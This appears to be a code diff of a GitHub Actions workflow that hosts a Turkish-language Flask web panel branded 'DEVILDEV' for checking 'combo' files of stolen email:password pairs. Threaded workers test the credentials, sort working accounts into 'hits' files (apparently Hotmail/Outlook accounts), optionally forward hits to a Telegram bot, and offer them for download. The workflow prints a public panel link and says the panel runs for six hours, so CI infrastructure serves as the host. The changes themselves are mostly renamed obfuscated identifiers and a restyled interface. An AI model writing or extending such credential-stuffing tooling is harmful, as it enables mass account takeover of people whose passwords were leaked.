-                      <strong>Status:</strong> <span id='statusText' style='color: #8b949e;'>IDLE</span>
-                      <br><br>
-                      <strong>Total:</strong> <span id='statTotal'>0</span> &nbsp;|&nbsp; 
-                      <strong class='hit'>Hits:</strong> <span id='statHits'>0</span> &nbsp;|&nbsp; 
-                      <strong class='free'>Free:</strong> <span id='statFree'>0</span> &nbsp;|&nbsp; 
-                      <strong class='retry'>Bad/Retries:</strong> <span id='statBad'>0</span>
+              <div class="container">
+                  <div class="header">
+                      <div class="logo">██████╗ ███████╗██╗   ██╗██╗██╗
+          ██╔══██╗██╔════╝██║   ██║██║██║
+          ██║  ██║█████╗  ██║   ██║██║██║
+          ██║  ██║██╔══╝  ╚██╗ ██╔╝██║██║
+          ██████╔╝███████╗ ╚████╔╝ ██║███████╗
+          ╚═════╝ ╚══════╝  ╚═══╝  ╚═╝╚══════╝</div>
                   </div>
-
-                  <div class='log-box' id='logBox'></div>
-
-                  <div class='download-links' id='downloadLinks'>
+                  <div class="panel">
+                      <div class="left-panel">
+                          <form id="uploadForm" enctype="multipart/form-data">
+                              <div class="form-group">
+                                  <label>Telegram Bot Token (Opsiyonel)</label>
+                                  <input type="text" name="token" placeholder="123456:ABCDEF...">
+                              </div>
+                              <div class="form-group">
+                                  <label>Chat ID (Opsiyonel)</label>
+                                  <input type="text" name="chat_id" placeholder="-100123456">
+                              </div>
+                              <div class="form-group">
+                                  <label>Combo Dosyası (.txt)</label>
+                                  <input type="file" name="file" accept=".txt" required>
+                              </div>
+                              <button type="submit" class="btn-start" id="submitBtn">███████ BAŞLAT ███████</button>
+                          </form>
+                      </div>
+                      <div class="right-panel">
+                          <div class="stats-bar">
+                              <div class="stat-item"><div class="stat-label">DURUM</div><div class="stat-value" id="statusText" style="font-size:14px; color:#888;">HAZIR</div></div>
+                              <div class="stat-item"><div class="stat-label">TOPLAM</div><div class="stat-value" id="statTotal">0</div></div>
+                              <div class="stat-item"><div class="stat-label">HIT</div><div class="stat-value hit" id="statHits">0</div></div>
+                              <div class="stat-item"><div class="stat-label">FREE</div><div class="stat-value free" id="statFree">0</div></div>
+                              <div class="stat-item"><div class="stat-label">BAD</div><div class="stat-value bad" id="statBad">0</div></div>
+                          </div>
+                          <div class="log-box" id="logBox"></div>
+                          <div class="downloads" id="downloadLinks"></div>
+                      </div>
                   </div>
               </div>
-
               <script>
                   $(document).ready(function() {
                       $('#uploadForm').on('submit', function(e) {
                           e.preventDefault();
                           var formData = new FormData(this);
-                          $('#submitBtn').prop('disabled', true).val('Starting...');
+                          $('#submitBtn').prop('disabled', true).text('BAŞLATILIYOR...').css('background-color', '#333');
                           $.ajax({
-                              url: '/',
-                              type: 'POST',
-                              data: formData,
-                              processData: false,
-                              contentType: false,
-                              success: function(response) {
-                                  $('#submitBtn').val('Process Started Successfully');
-                                  $('#statusText').text('RUNNING').css('color', '#3fb950');
+                              url: '/', type: 'POST', data: formData, processData: false, contentType: false,
+                              success: function() {
+                                  $('#submitBtn').text('ÇALIŞIYOR...');
+                                  $('#statusText').text('ÇALIŞIYOR').css('color', '#00ff66');
                               },
-                              error: function() {
-                                  $('#submitBtn').prop('disabled', false).val('Start Checking');
-                              }
+                              error: function() { $('#submitBtn').prop('disabled', false).text('███████ BAŞLAT ███████').css('background-color', '#ff003c'); }
                           });
                       });
-
                       setInterval(function() {
                           $.get('/api/logs', function(data) {
                               var logBox = $('#logBox');
                               logBox.empty();
                               for (var i = 0; i < data.logs.length; i++) {
                                   var log = data.logs[i];
-                                  var cls = 'retry';
-                                  if (log.includes('[HIT]')) cls = 'hit';
-                                  else if (log.includes('[FREE]')) cls = 'free';
+                                  var cls = 'log-bad';
+                                  if (log.includes('[HIT]')) cls = 'log-hit';
+                                  else if (log.includes('[FREE]')) cls = 'log-free';
+                                  else if (log.includes('[RETRY]')) cls = 'log-retry';
                                   logBox.append('<div class="' + cls + '">' + log + '</div>');
                               }
                               logBox.scrollTop(logBox[0].scrollHeight);
-
                               $('#statTotal').text(data.stats.total);
                               $('#statHits').text(data.stats.hits);
                               $('#statFree').text(data.stats.free);
                               $('#statBad').text(data.stats.bad);
-
                               if (data.status === 'finished') {
-                                  $('#statusText').text('FINISHED').css('color', '#d29922');
+                                  $('#statusText').text('TAMAMLANDI').css('color', '#ffcc00');
+                                  $('#submitBtn').prop('disabled', false).text('███████ BAŞLAT ███████').css('background-color', '#ff003c');
                               }
-
                               var links = '';
-                              if (data.has_hits) links += "<a href='/download/hits'>⬇ Download Hits</a>";
-                              if (data.has_free) links += "<a href='/download/free'>⬇ Download Free</a>";
+                              if (data.has_hits) links += "<a href='/download/hits' class='btn-download'>📊 İndir: Hitler</a>";
+                              if (data.has_free) links += "<a href='/download/free' class='btn-download'>📊 İndir: Free</a>";
                               $('#downloadLinks').html(links);
                           });
-                      }, 2000);
+                      }, 1500);
                   });
               </script>
           </body>
@@ -471,24 +418,24 @@ jobs:
               if request.method == 'POST' and active_task['status'] != 'running':
                   f = request.files.get('file')
                   if f:
-                      token = request.form.get('token', '').strip()
-                      chat_id = request.form.get('chat_id', '').strip()
+                      token, chat_id = request.form.get('token', '').strip(), request.form.get('chat_id', '').strip()
                       fpath = os.path.join(app.config['UPLOAD_FOLDER'], secure_filename(f.filename))
                       f.save(fpath)
                       combos = altiustulegend(fpath)
                       if combos:
-                          notifier = umidiemcan(token, chat_id) if token and chat_id else None
+                          notifier = TelegramNotifier(token, chat_id) if token and chat_id else None
                           for fn in ['octohotmail.txt', 'octofree.txt']:
                               if os.path.exists(fn): os.remove(fn)
                           q = Queue()
                           lock = threading.Lock()
-                          stats = elhamdulillah()
+                          stats = Stats()
                           active_task = {'status': 'running', 'stats': stats}
                           log_messages = []
+                          keywords = [v['sender'] for v in SENDERS.values()]
                           def worker_wrapper():
                               threads = []
                               for _ in range(buoc):
-                                  t = threading.Thread(target=biriyetmezikincisiolsun, args=(q, notifier, 'octohotmail.txt', lock, stats, log_queue))
+                                  t = threading.Thread(target=worker, args=(q, notifier, 'octohotmail.txt', lock, stats, keywords))
                                   t.start()
                                   threads.append(t)
                               for combo in combos: q.put(combo)
@@ -497,31 +444,16 @@ jobs:
                               for t in threads: t.join()
                               active_task['status'] = 'finished'
                           threading.Thread(target=worker_wrapper, daemon=True).start()
-              st = active_task['stats'] if active_task['stats'] else elhamdulillah()
-              return render_template_string(HTML_TEMPLATE, 
-                  status=active_task['status'], 
-                  stats={'total': st.total, 'hits': st.bababualemdeteek, 'free': st.zencipuruna, 'bad': st.saxsko + st.mahsummmedet}, 
-                  logs=log_messages,
-                  token=request.form.get('token', '') if request.method == 'POST' else '',
-                  chat_id=request.form.get('chat_id', '') if request.method == 'POST' else '',
-                  has_hits=os.path.exists('octohotmail.txt'),
-                  has_free=os.path.exists('octofree.txt')
-              )
+              st = active_task['stats'] if active_task['stats'] else Stats()
+              return render_template_string(HTML_TEMPLATE)
 
           @app.route('/api/logs')
           def api_logs():
               global log_messages
-              while not log_queue.empty():
-                  log_messages.append(log_queue.get())
-              if len(log_messages) > 100: log_messages = log_messages[-100:]
-              st = active_task['stats'] if active_task['stats'] else elhamdulillah()
-              return {
-                  'status': active_task['status'],
-                  'stats': {'total': st.total, 'hits': st.bababualemdeteek, 'free': st.zencipuruna, 'bad': st.saxsko + st.mahsummmedet},
-                  'logs': log_messages,
-                  'has_hits': os.path.exists('octohotmail.txt'),
-                  'has_free': os.path.exists('octofree.txt')
-              }
+              while not log_queue.empty(): log_messages.append(log_queue.get())
+              if len(log_messages) > 150: log_messages = log_messages[-150:]
+              st = active_task['stats'] if active_task['stats'] else Stats()
+              return {"status": active_task['status'], "stats": {"total": st.total, "hits": st.hits, "free": st.free, "bad": st.bad}, "logs": log_messages, "has_hits": os.path.exists('octohotmail.txt'), "has_free": os.path.exists('octofree.txt')}
 
           @app.route('/download/<ftype>')
           def download(ftype):
@@ -544,11 +476,10 @@ jobs:
           if [ -n "$LINK" ]; then
               echo ""
               echo "=============================================="
-              echo "PANEL LINKI BURADA: $LINK"
+              echo "DEVILDEV PANEL LINKI: $LINK"
               echo "=============================================="
               echo ""
-              echo "YUKARIDAKI LINKI KOPYALA VE TARAYICINA YAPISTIR"
-              echo "6 SAAT BOYUNCA KESİNTİSİZ ÇALIŞACAKTIR."
+              echo "6 SAAT KESİNTİSİZ ÇALIŞACAKTIR."
               echo ""
           else
               echo "Link olusurken hata oldu, asagidaki loglara bak:"
